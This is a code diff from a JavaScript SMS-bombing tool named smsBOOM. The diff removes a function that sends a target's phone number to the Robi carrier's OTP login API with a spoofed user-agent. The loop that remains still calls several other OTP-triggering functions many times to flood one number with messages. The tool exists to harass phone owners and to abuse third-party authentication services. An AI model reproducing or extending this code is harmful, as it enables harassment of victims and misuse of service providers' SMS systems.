@@ -297,36 +297,6 @@ async function smsBOOM(number, amount) {
 
   // function https://webapi.robi.com.bd/v1/account/login/otp
 
-  function robi(no) {
-    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
-    request
-      .post({
-        url: "https://webapi.robi.com.bd/v1/account/login/otp",
-        headers: randomUseragent,
-        body: JSON.stringify({
-          password: "",
-          phone_number: no,
-          redirectTo: null,
-        }),
-      })
-      .on("response", function (response) {
-        if (response.statusCode == 200) {
-          dataFSms.sent++;
-          console.log(response);
-          return dataFSms;
-        } else {
-          dataFSms.faild++;
-          console.log(response);
-          return dataFSms;
-        }
-      })
-      .on("error", function (error) {
-        dataFSms.faild++;
-        console.log(error);
-        return dataFSms;
-      });
-  }
-
   function send(no) {
     ecuriar(no);
     swap(no);
@@ -339,8 +309,6 @@ async function smsBOOM(number, amount) {
     gpwebms(no);
     weblogin(no);
     console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
-
-    // robi(no);
   }
 
   for (let i = 0; i < amount; i++) {
